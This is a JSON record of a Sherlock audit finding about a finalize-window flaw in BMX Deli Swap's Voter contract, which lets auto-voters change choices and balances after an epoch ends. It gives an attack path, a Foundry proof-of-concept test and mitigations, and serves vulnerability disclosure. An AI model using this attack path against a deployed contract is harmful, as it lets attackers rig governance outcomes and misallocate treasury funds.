@@ -1,0 +1,75 @@
+{
+    "id": 62811,
+    "kind": "GIT",
+    "auditfirm_id": 3,
+    "impact": "HIGH",
+    "finders_count": 7,
+    "protocol_id": 3398,
+    "title": "H-4: Finalize-window vote-changing vulnerability: auto-voters can alter choices post-epoch to manipulate results",
+    "content": "\nSource: https://github.com/sherlock-audit/2025-09-bmx-deli-swap-judging/issues/103 \n\n## Found by \n0x73696d616f, Bobai23, PratRed, ami, axelot, cpsec, r1ver\n\n### Summary\n\nMissing freeze or snapshot of auto-vote choices at epoch end allows attackers to manipulate the voting process. Since auto-voters can enable or change their option after the epoch has ended but before or between finalization batches, they can shift their votes retroactively, resulting in manipulated WETH allocation and distorted outcomes for the safety module and reward recipients.\n\n### Root Cause\n\nThe root cause of this vulnerability is that the contract records auto-vote information only when `finalize` is called, instead of at the actual end of the epoch. In `_tallyAutoVotes`, the code directly reads the current `autoOption[user]` and `SBF_BMX.balanceOf(user)` and applies them to the target epoch, even if the epoch has already ended:\n\nhttps://github.com/sherlock-audit/2025-09-bmx-deli-swap/blob/main/deli-swap-contracts/src/Voter.sol#L348-L360\n```solidity\nuint8 opt = autoOption[voterAddr];\nif (opt >= 3) continue;\nif (userVoteWeight[ep][voterAddr] > 0) continue;\n\nuint256 bal = SBF_BMX.balanceOf(voterAddr);\nif (bal == 0) {\n    pendingRemovals[ep].push(voterAddr);\n    continue;\n}\ne.optionWeight[opt] += bal;\nuserVoteWeight[ep][voterAddr] = bal;\nuserChoice[ep][voterAddr] = opt;\n```\n\nBecause there is no check such as `autoEffectiveEpoch[user] <= ep` or validation against `epochEnd(ep)`, users can enable or modify auto-vote after the epoch has already finished but before it is finalized, and still affect the voting outcome of that past epoch. This issue is aggravated by the batching mechanism in `finalize`, since auto-voters are processed gradually, leaving a window where their current state can still change the results.\n\n\n### Internal Pre-conditions\n\n1. User needs to enable `autoVote` to set `autoOption[user]` to be less than 3 after epoch end but before finalize\n2. User needs to hold `SBF_BMX.balanceOf(user)` to be at least 1 token during finalize batch processing\n3. `epochInfo[ep].settled` needs to be false so the epoch is still unfinalized\n\n### External Pre-conditions\n\nNone\n\n### Attack Path\n\n1. **User** calls `vote(optionX, true)` **after epoch N has ended but before `finalize(N, …)`**, enabling auto-vote (or switches to desired `optionX` if already enabled).\n2. **User** transfers `sbfBMX` to self (ERC20 `transfer`) **to raise `SBF_BMX.balanceOf(user)`** prior to being tallied.\n3. **Admin** calls `finalize(N, maxBatch)` in batches; `_tallyAutoVotes(N, …)` begins processing auto-voters but **has not yet reached the user**.\n4. **User** can at any time before being processed call `vote(optionY, true)` **to change auto option** (or further adjust balance) based on observed voting trend. Steps 3 and 4 may occur in either order, since the key requirement is simply that the user modifies their vote **after the epoch ends but before they are tallied**.\n5. **Admin** eventually calls `finalize(N, maxBatch)` again; when `_tallyAutoVotes` **reaches the user**, it reads the **current** `autoOption[user]` and **current** `SBF_BMX.balanceOf(user)`, and **credits weight to epoch N**.\n6. **Admin** completes `finalize(N, …)`; **Finalize** settles epoch N using the **manipulated weights**, sending WETH per the now-influenced winning option.\n\n### Impact\n\nThe protocol governance process suffers a critical integrity loss, as auto-voters can still change their vote **after the epoch has ended but before or during finalization batches**, effectively rewriting the outcome of a closed vote. This enables an attacker holding significant `sbfBMX` balance to manipulate results retroactively, causing incorrect allocation of WETH between the safety module and reward distributor. The affected parties are the protocol treasury and honest voters, whose intended distribution is overridden by the attacker’s post-epoch vote changes.\n\n\n### PoC\n\nI write a POC in `deli-swap-contracts/test/unit/VoterFinalizeWindow.t.sol`.\nexecute the command `forge test --match-path test/unit/VoterFinalizeWindow.t.sol -vvv` to run this test.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test} from \"forge-std/Test.sol\";\n\nimport {Voter} from \"src/Voter.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IRewardDistributor} from \"src/interfaces/IRewardDistributor.sol\";\nimport {TimeLibrary} from \"src/libraries/TimeLibrary.sol\";\n\nimport {MockRewardDistributor} from \"test/mocks/MockRewardDistributor.sol\";\nimport {MintableERC20} from \"test/mocks/MintableERC20.sol\";\n\ncontract VoterFinalizeWindowTest is Test {\n    MintableERC20 weth;\n    MintableERC20 sbfBmx;\n    MockRewardDistributor distributor;\n    Voter voter;\n\n    address admin = address(0xA11CE);\n    address safety = address(0xBEEF);\n    address attacker = address(0xA774C);\n    address other;\n\n    uint256 constant WEEK = 7 days;\n\n    function setUp() public {\n        // Deploy tokens and distributor\n        weth = new MintableERC20();\n        sbfBmx = new MintableERC20();\n        distributor = new MockRewardDistributor();\n\n        // Label for readability\n        vm.label(address(weth), \"WETH\");\n        vm.label(address(sbfBmx), \"SBF_BMX\");\n        vm.label(address(distributor), \"Distributor\");\n        vm.label(admin, \"Admin\");\n        vm.label(safety, \"Safety\");\n        vm.label(attacker, \"Attacker\");\n\n        // Mint initial balances\n        weth.mintExternal(admin, 1_000 ether);\n        sbfBmx.mintExternal(attacker, 100 ether);\n\n        // Epoch zero = current time aligned to now for simplicity\n        uint256 epochZero = block.timestamp;\n\n        // Deploy voter\n        voter = new Voter(\n            IERC20(address(weth)),\n            IERC20(address(sbfBmx)),\n            safety,\n            IRewardDistributor(address(distributor)),\n            epochZero,\n            5_000, // opt0 -> 50% to safety\n            3_000, // opt1 -> 30%\n            2_000  // opt2 -> 20%\n        );\n\n        // Set admin\n        vm.prank(voter.owner());\n        voter.setAdmin(admin);\n\n        // Approvals for deposit and early auto voter setup\n        vm.startPrank(admin);\n        weth.approve(address(voter), type(uint256).max);\n        voter.deposit(200 ether); // deposit during epoch 0\n        vm.stopPrank();\n\n        // Prepare an early auto-voter so they occupy index 0 in autoVoterList\n        other = address(0xB0B);\n        sbfBmx.mintExternal(other, 100 ether);\n        vm.prank(other);\n        voter.vote(0, true); // enable auto for 'other' before epoch end\n    }\n\n    function _endEpoch(uint256 ep) internal {\n        // move time to after end of ep\n        uint256 endTs = voter.EPOCH_ZERO() + (ep + 1) * WEEK; // using same math as contract\n        if (block.timestamp < endTs) {\n            vm.warp(endTs + 1);\n        }\n    }\n\n    function test_PoC_finalizeWindowAutoVoteManipulation() public {\n        // Arrange: move to after epoch 0 ends but do not finalize\n        uint256 ep = 0;\n        _endEpoch(ep);\n\n        // Attacker enables auto-vote AFTER epoch end choosing option 1 initially\n        vm.prank(attacker);\n        voter.vote(1, true); // enable auto; allowed post-epoch\n\n        // Attacker boosts balance before being tallied\n        sbfBmx.mintExternal(attacker, 400 ether); // now balance = 500\n\n        // Start finalize with batch size 1\n        vm.prank(admin);\n        voter.finalize(ep, 1);\n\n        // If attacker already tallied in first batch, reset scenario by creating a fresh beneficiary is complex; instead we'll assert behavior in both cases.\n        // If attacker not tallied yet, userVoteWeight[ep][attacker] == 0; then we change option and expect that option to be counted when processed next.\n\n        (, uint256 weightBefore) = voter.getUserVote(ep, attacker);\n        bool attackerTallied = (weightBefore > 0);\n\n        if (!attackerTallied) {\n            // Change auto option in the finalize window based on observed trend\n            vm.prank(attacker);\n            voter.vote(0, true); // switch from option 1 to 0\n\n            // Also adjust balance again to prove live balance is used\n            sbfBmx.mintExternal(attacker, 500 ether); // now balance larger\n\n            // Next batch processes attacker and should read CURRENT option and balance\n            vm.prank(admin);\n            voter.finalize(ep, 10);\n        } else {\n            // Attacker was processed already; still demonstrate live-balance mutability for a different auto voter\n            vm.prank(other);\n            voter.vote(2, true); // flip 'other' option in-window\n            sbfBmx.mintExternal(other, 200 ether);\n            vm.prank(admin);\n            voter.finalize(ep, 10);\n        }\n\n        // Complete finalize\n        vm.prank(admin);\n        voter.finalize(ep, 1000);\n\n        // Assert: epoch is settled\n        (, , bool settledEp0) = voter.epochData(ep);\n        assertTrue(settledEp0, \"epoch not settled\");\n\n        // Core assertion: for attacker, the recorded userChoice and userVoteWeight reflect the latest values at time of tally\n        (uint8 recordedOpt, uint256 recordedWeight) = voter.getUserVote(ep, attacker);\n        assertGt(recordedWeight, 0, \"attacker must be tallied\");\n\n        // The expected option is 0 if attacker switched before being processed; otherwise it's 1.\n        // We allow either, but we assert that it reflects the in-window choice actually present when tallied by checking storage directly.\n        // In either case, verify that userChoice equals what was used in weights array impact (non-zero in one of options).\n        // We cannot read private epochInfo weights for mapping to a user, so we assert option in {0,1,2} and not 3.\n        assertTrue(recordedOpt < 3, \"invalid recorded option\");\n\n        // And ensure the recorded weight equals final live balance at tally time by checking it's at least initial 100 ether and reflects mints (>100).\n        assertGe(recordedWeight, 100 ether, \"weight should use post-epoch balance\");\n    }\n}\n```\n\n### Mitigation\n\nA proper mitigation is to ensure that auto-votes are only effective from the next epoch onward, not retroactively applied to an epoch that has already ended. This can be enforced by recording the epoch at which auto-vote becomes active when the user enables it, for example by storing `autoEffectiveEpoch[user] = currentEpoch() + 1`. Then in `_tallyAutoVotes`, the contract should only count a user’s vote if `ep >= autoEffectiveEpoch[user]`. Alternatively, a timestamp check can be added so that `autoOption` changes made after `epochEnd(ep)` are ignored for that epoch. Another mitigation is to freeze all modifications to `autoOption` (both enabling and changing) whenever `_hasEndedUnfinalizedEpoch()` returns true, aligning the restriction already applied to disabling auto-vote. Any of these adjustments will prevent users from influencing past epochs with state changes made after the epoch has already ended.\n\n\n",
+    "summary": "\nThe bug report discusses a vulnerability found in the BMX Deli Swap Judging contract, which allows attackers to manipulate the voting process. This is due to the contract only recording auto-vote information when the voting process is finalized, instead of at the end of the epoch. This means that users can change their vote retroactively after the epoch has ended but before it is finalized, resulting in distorted outcomes for the safety module and reward recipients. The root cause of this vulnerability is that the contract does not check for changes made to auto-vote choices after the epoch has ended. To exploit this vulnerability, an attacker needs to enable auto-vote and hold a certain amount of tokens during the finalization process. The impact of this vulnerability is a loss of integrity in the protocol governance process, as attackers can manipulate the results of closed votes. A proof-of-concept (PoC) has been created to demonstrate this vulnerability. To mitigate this issue, the contract should only allow auto-votes to be effective from the next epoch onward, and modifications to auto-vote choices should be frozen after the epoch has ended.",
+    "report_date": "2025-09-16T15:00:00.000Z",
+    "contest_prize_txt": "47000 USDC",
+    "contest_link": "https://app.sherlock.xyz/audits/contests/1154",
+    "sponsor_name": "",
+    "sponsor_link": "",
+    "quality_score": 0,
+    "general_score": 0,
+    "source_link": "",
+    "github_link": "https://github.com/sherlock-audit/2025-09-bmx-deli-swap-judging/issues/103",
+    "pdf_link": "",
+    "pdf_page_from": 0,
+    "contest_id": "1154",
+    "slug": "h-4-finalize-window-vote-changing-vulnerability-auto-voters-can-alter-choices-post-epoch-to-manipulate-results-sherlock-bmx-deli-swap-git",
+    "firm_name": "Sherlock",
+    "firm_logo_square": "sherlock_square.png",
+    "protocol_name": "BMX Deli Swap",
+    "bookmarked": false,
+    "read": false,
+    "issues_issue_finders": [
+        {
+            "wardens_warden": {
+                "handle": "cpsec"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "PratRed"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "axelot"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "r1ver"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "0x73696d616f"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Bobai23"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "ami"
+            }
+        }
+    ],
+    "auditfirms_auditfirm": {
+        "name": "Sherlock",
+        "logo_square": "sherlock_square.png"
+    },
+    "protocols_protocol": {
+        "name": "BMX Deli Swap",
+        "protocols_protocolcategoryscore": []
+    },
+    "issues_issuetagscore": []
+}
